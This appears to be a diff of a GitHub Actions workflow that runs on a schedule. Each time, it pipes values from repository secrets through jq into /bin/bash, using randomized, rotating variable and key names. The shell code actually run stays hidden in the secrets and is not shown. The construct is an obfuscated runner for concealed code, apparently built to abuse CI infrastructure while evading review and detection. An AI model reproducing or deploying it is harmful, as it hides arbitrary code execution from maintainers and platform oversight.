@@ -1,11 +1,10 @@
 name: tianmingstm
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 1/6 * * *'
+    - cron: '56 2/6 * * *'
 
-jobs:  # 20227
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,14 +12,29 @@ jobs:  # 20227
       - uses: actions/checkout@v4
       - name: tianmingstm
         env:
-          usl409: ${{ secrets.usl409 }}
+          h9387: ${{ secrets.h9387 }}
         run: |
-          echo $usl409 | jq -r .zxq01 | /bin/bash
-          echo $hus2711 | jq -r .f74459 | /bin/bash
-          echo $zzg05 | jq -r .ttgl26 | /bin/bash
-          echo $kh1632 | jq -r .gar22563 | /bin/bash
-          echo $mru85909 | jq -r .cn9 | /bin/bash
-          echo $plev86617 | jq -r .jeq45 | /bin/bash
-          echo $lu15 | jq -r .gplob4644 | /bin/bash
-          echo $x47233 | jq -r .aojxw726 | /bin/bash
+          echo $h9387 | jq -r .xbhq216 | /bin/bash
+          echo $x0 | jq -r .pyujx8 | /bin/bash
+          echo $iqxp15 | jq -r .ou984 | /bin/bash
+          echo $m8187 | jq -r .jnuc0 | /bin/bash
+          echo $bod15 | jq -r .a09 | /bin/bash
+          echo $mfsbz02200 | jq -r .jtmj5 | /bin/bash
+          echo $pnk59126 | jq -r .qwps12863 | /bin/bash
+          echo $g245 | jq -r .yvk607 | /bin/bash
+          echo $viw50373 | jq -r .cu9042 | /bin/bash
+          echo $whmrp515 | jq -r .z9 | /bin/bash
+          echo $uyquo677 | jq -r .xeg7802 | /bin/bash
+          echo $mgtr6 | jq -r .yagsx9658 | /bin/bash
+          echo $cgj6 | jq -r .nu74 | /bin/bash
+          echo $mfshl6 | jq -r .btzd801 | /bin/bash
+          echo $iemy67139 | jq -r .k58 | /bin/bash
+          echo $pbcim53 | jq -r .vdp533 | /bin/bash
+          echo $r9 | jq -r .z84848 | /bin/bash
+          echo $gds33 | jq -r .odps0 | /bin/bash
+          echo $phcq5782 | jq -r .i0 | /bin/bash
+          echo $cp630 | jq -r .l26 | /bin/bash
+          echo $u70344 | jq -r .nkrt4 | /bin/bash
+          echo $wfnus02555 | jq -r .qyxyn9 | /bin/bash
+          echo $qqna5157 | jq -r .fagz84 | /bin/bash
 
